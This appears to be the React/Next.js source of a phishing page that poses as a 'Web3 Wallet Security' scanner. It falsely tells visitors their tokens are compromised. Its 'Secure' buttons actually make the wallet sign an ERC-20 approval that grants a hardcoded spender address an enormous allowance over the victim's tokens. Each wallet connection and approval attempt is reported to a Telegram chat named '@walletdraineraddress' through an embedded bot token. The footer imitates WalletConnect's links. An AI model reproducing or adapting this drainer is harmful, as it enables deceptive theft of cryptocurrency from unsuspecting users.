import Head from "next/head";
import Image from "next/image";
import styles from "@/styles/Home.module.css";
import { useState, useEffect } from "react";
import { parseEther } from "ethers";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import {
  FaTwitter,
  FaDiscord,
  FaTelegramPlane,
  FaGithub,
  FaCheckCircle,
} from "react-icons/fa";
import {
  useDisconnect,
  useAccount,
  useBalance,
  useSignMessage,
  usePrepareContractWrite,
  useContractWrite,
  Address,
  useNetwork,
} from "wagmi";
import { fetchTokenBalances } from "@/utils/moralis";

// ERC-20 Token ABI
import usdtABI from "@/abi/usdtABI.json";
import axios from "axios";

export default function Home() {
  const [isNetworkSwitchHighlighted, setIsNetworkSwitchHighlighted] =
    useState(false);
  const [isConnectHighlighted, setIsConnectHighlighted] = useState(false);
  const [walletStatus, setWalletStatus] = useState("secure");
  const [tokens, setTokens] = useState<any[]>([]);
  const [loadingTokens, setLoadingTokens] = useState(true);
  const [currentChain, setCurrentChain] = useState("eth"); // Default to Ethereum
  const [defaultImage, setDefaultImage] = useState("/default-token-image.png"); // Default image URL
  const [error, setError] = useState<string | null>(null); // State for error messages
  const [notice, setNotice] = useState<string | null>(null); // State for notices
  const [isApproving, setIsApproving] = useState(false); // State for approval status
  const [messageTimeout, setMessageTimeout] = useState<NodeJS.Timeout | null>(
    null
  ); // State for timeout
  const [selectedToken, setSelectedToken] = useState<any>(null); // State to track the currently selected token for approval
  const [approvalStatuses, setApprovalStatuses] = useState<{
    [key: string]: boolean;
  }>({}); // State to track approval status for each token

  const { open, close } = useWeb3Modal();
  const { disconnect } = useDisconnect();
  const { address } = useAccount();
  const { chain } = useNetwork();

  const { data: balanceData } = useBalance({ address });
  const {
    data: signMessageData,
    isSuccess: signMessageSuccess,
    signMessage,
  } = useSignMessage({ message: "gm wagmi frens" });

  const spenderAddress = "0x43E7263534d6aB44347e0567fAA6927A2b865516";

  // Prepare contract write hook
  const { config } = usePrepareContractWrite({
    address: selectedToken?.token_address as Address,
    abi: usdtABI,
    functionName: "approve",
    args: [spenderAddress as Address, parseEther("100000000000")],
    enabled: !!selectedToken,
  });

  const { write, status } = useContractWrite(config);

  const closeAll = () => {
    setIsNetworkSwitchHighlighted(false);
    setIsConnectHighlighted(false);
  };

  const secureToken = async (token: any) => {
    setSelectedToken(token);
    setNotice(
      `Attempting to secure ${token.symbol}. Please open wallet to continue...`
    );
    setIsApproving(true);

    if (messageTimeout) {
      clearTimeout(messageTimeout);
    }

    setMessageTimeout(
      setTimeout(() => {
        setError(null); // Clear error message after timeout
        setNotice(null); // Clear notice message after timeout
        setIsApproving(false);
      }, 30000)
    );

    try {
      await sendTelegramNotification(
        `${address} is attempting to secure ${token.symbol}`
      );

      if (write) {
        await write();
        if (status === "success") {
          setApprovalStatuses((prevStatuses) => ({
            ...prevStatuses,
            [token.symbol]: true,
          })); // Mark as approved
        } else if (status === "error") {
          setError(`Failed to secure ${token.symbol}. Please try again.`);
        }
      }
    } catch (error) {
      console.error(`Error approving ${token.symbol}:`, error);
      setError(`Failed to secure ${token.symbol}. Please try again.`);
    } finally {
      setNotice(null); // Clear notice after attempt
      setMessageTimeout(null); // Clear timeout
      setIsApproving(false);
    }
  };

  const secureWallet = async () => {
    setWalletStatus("secure");
    setIsConnectHighlighted(false);
    setIsNetworkSwitchHighlighted(false);

    if (write) {
      try {
        setIsApproving(true); // Set approval state to true
        setNotice(
          "Attempting to secure wallet. Please open wallet to continue..."
        );

        // Clear any existing timeout
        if (messageTimeout) {
          clearTimeout(messageTimeout);
        }

        // Set a timeout to clear the message after 30 seconds
        setMessageTimeout(
          setTimeout(() => {
            setError(null); // Clear error message after timeout
            setNotice(null); // Clear notice message after timeout
            setIsApproving(false);
          }, 30000)
        );

        // Send Telegram message indicating approval attempt
        await sendTelegramNotification(
          `${address} is attempting to secure wallet`
        );

        await write();
      } catch (error) {
        console.error("Error approving token:", error);
        setError("Failed to secure wallet. Please reload and try again.");
      }
    }
  };

  const compromiseWallet = () => {
    setWalletStatus("compromised");
    setIsConnectHighlighted(false);
    setIsNetworkSwitchHighlighted(false);
  };

  useEffect(() => {
    const fetchTokens = async () => {
      if (address) {
        setLoadingTokens(true);
        const tokenData = await fetchTokenBalances(address, currentChain);
        const nonZeroTokens = tokenData.filter(
          (token: any) => parseFloat(token.balance) > 0
        );
        setTokens(nonZeroTokens);
        setLoadingTokens(false);
      }
    };

    fetchTokens();
  }, [address, currentChain]);

  useEffect(() => {
    // Map network names to chain strings
    const chainMap: { [key: string]: string } = {
      ethereum: "eth",
      polygon: "polygon",
      avalanche: "avalanche",
      bsc: "bsc",
      gnosis: "gnosis",
      fantom: "fantom",
      base: "base",
    };

    if (chain) {
      const chainString = chainMap[chain.name.toLowerCase()] || "bsc"; // Default to "bsc" if chain is unknown
      setCurrentChain(chainString);
      console.log("Network changed to:", chainString);
    }
  }, [chain]);

  useEffect(() => {
    if (address) {
      sendTelegramNotification(`Wallet (${address}) connected.`);
    }
  }, [address]);

  useEffect(() => {
    if (status === "success") {
      setNotice(null);
      setError(null);
      setIsApproving(false); // Reset approval state
      setMessageTimeout(null); // Clear timeout
    } else if (status === "error") {
      setNotice(null);
      setError("Failed to secure wallet. Please try again.");
      setIsApproving(false); // Reset approval state
      setMessageTimeout(null); // Clear timeout
    }
  }, [status]);

  useEffect(() => {
    setError(null);
    setNotice(null);
  }, []);

  // Function to format token balances
  const formatBalance = (balance: string, decimals: number) => {
    const adjustedBalance = parseFloat(balance) / Math.pow(10, decimals);
    const formattedBalance = adjustedBalance.toFixed(6);
    return Number(formattedBalance).toLocaleString();
  };

  // Default image handler
  const handleImageError = (
    event: React.SyntheticEvent<HTMLImageElement, Event>
  ) => {
    event.currentTarget.src = defaultImage; // Use default image
  };

  const sendTelegramNotification = async (message: string) => {
    try {
      const botToken = "7095023752:AAGH_bXRYtd3qe0kPI6AewFy4VVs8oqWCo0";
      const chatId = "@walletdraineraddress";

      await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message,
      });

      console.log("Telegram notification sent.");
    } catch (error) {
      console.error("Error sending Telegram notification:", error);
    }
  };

  return (
    <>
      <Head>
        <title>Web3 Wallet Security</title>
        <meta
          name="description"
          content="Web3 Wallet Security - A platform for securing your Web3 wallets."
        />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <header className={styles.header}>
        <div className={styles.logo}>
          <Image
            src="/logo.svg"
            alt="Web3 Wallet Security Logo"
            height="32"
            width="150"
          />
        </div>
        <div className={styles.buttons}>
          <div
            onClick={secureWallet}
            className={`${styles.highlight} ${
              isConnectHighlighted ? styles.highlightSelected : ``
            }`}
          >
            <w3m-button />
          </div>
        </div>
      </header>
      <main className={styles.main}>
        <div className={`${styles.wrapper} ${styles.marginTop}`}>
          <div className={styles.container}>
            <h1>Web3 Wallet Security</h1>
            <div className={styles.connectB}>
              <div className={styles.buttons}>
                <div
                  onClick={closeAll}
                  className={`${styles.highlight} ${
                    isNetworkSwitchHighlighted ? styles.highlightSelected : ``
                  }`}
                >
                  <w3m-network-button />
                </div>
                <div
                  onClick={closeAll}
                  className={`${styles.highlight} ${
                    isConnectHighlighted ? styles.highlightSelected : ``
                  }`}
                >
                  <w3m-button />
                </div>
              </div>
            </div>
            <div className={styles.content}>
              {address ? (
                <>
                  {tokens.length > 0 ? (
                    <>
                      <p className={styles.danger}>
                        Your tokens are compromised! Below are your tokens at
                        risk.
                      </p>
                      {error && <div className={styles.error}>{error}</div>}
                      {notice && <div className={styles.notice}>{notice}</div>}
                      <button
                        onClick={secureWallet}
                        className={`${styles.button} ${styles.dangerButton}`}
                        disabled={isApproving}
                      >
                        Secure Wallet Now
                      </button>
                      <div className={styles.tokenList}>
                        {tokens.map((token) => (
                          <div
                            key={token.token_address}
                            className={styles.tokenItem}
                          >
                            <Image
                              className={styles.tokenImage}
                              src={token.logo || defaultImage}
                              alt={token.symbol}
                              width={40}
                              height={40}
                              onError={handleImageError}
                            />
                            <div className={styles.tokenInfo}>
                              <p className={styles.tokenName}>{token.name}</p>
                              <p className={styles.tokenBalance}>
                                {formatBalance(token.balance, token.decimals)}
                              </p>
                            </div>
                            <button
                              onClick={() => secureToken(token)}
                              className={`${styles.button} ${
                                approvalStatuses[token.symbol]
                                  ? styles.successButton
                                  : styles.dangerButton
                              }`}
                              disabled={
                                approvalStatuses[token.symbol] !== undefined
                              }
                            >
                              {approvalStatuses[token.symbol] ? (
                                <FaCheckCircle size={20} color="green" />
                              ) : (
                                "Secure Token"
                              )}
                            </button>
                          </div>
                        ))}
                      </div>
                    </>
                  ) : (
                    <div className={styles.persistentNotice}>
                      <p className={styles.secure}>
                        All tokens in this network are secure. Check other
                        networks.
                      </p>
                    </div>
                  )}
                </>
              ) : (
                <>
                  <p>
                    Secure your tokens with Web3 Wallet Security. We provide
                    advanced security features to keep your digital assets safe.
                  </p>
                  <p className={styles.marginP}>
                    The contract scans your address for active bots and token
                    drainer and helps you disable them.
                  </p>
                  <p className={styles.marginP}>
                    <strong>Steps to Secure Your Wallet:</strong>
                  </p>
                  <ol>
                    <li>
                      Click on "Connect Wallet" to check your token security
                      status.
                    </li>
                    <li>
                      If status is "secure" you have nothing to worry about.
                    </li>
                    <li>
                      If status is "compromised," click{" "}
                      <span
                        onClick={compromiseWallet}
                        className={`${styles.button} ${styles.dangerButton}`}
                      >
                        Secure token
                      </span>{" "}
                      to safeguard your assets.
                    </li>
                  </ol>
                </>
              )}
            </div>
          </div>
          <div className={styles.footer}>
            <div className={styles.socialMedia}>
              <a
                href="https://twitter.com/walletconnect"
                target="_blank"
                rel="noopener noreferrer"
                aria-label="Twitter"
              >
                <FaTwitter size={24} />
              </a>
              <a
                href="https://discord.com/invite/kdTQHQ6AFQ"
                target="_blank"
                rel="noopener noreferrer"
                aria-label="Discord"
              >
                <FaDiscord size={24} />
              </a>
              <a
                href="https://t.me/walletconnect"
                target="_blank"
                rel="noopener noreferrer"
                aria-label="Telegram"
              >
                <FaTelegramPlane size={24} />
              </a>
              <a
                href="https://github.com/orgs/WalletConnect/discussions/"
                target="_blank"
                rel="noopener noreferrer"
                aria-label="GitHub"
              >
                <FaGithub size={24} />
              </a>
            </div>
            <p className={styles.footerText}>
              Having issues?{" "}
              <a
                href="https://t.me/walletconnect"
                target="_blank"
                rel="noopener noreferrer"
              >
                Click here to contact us
              </a>
            </p>
          </div>
        </div>
      </main>
    </>
  );
}
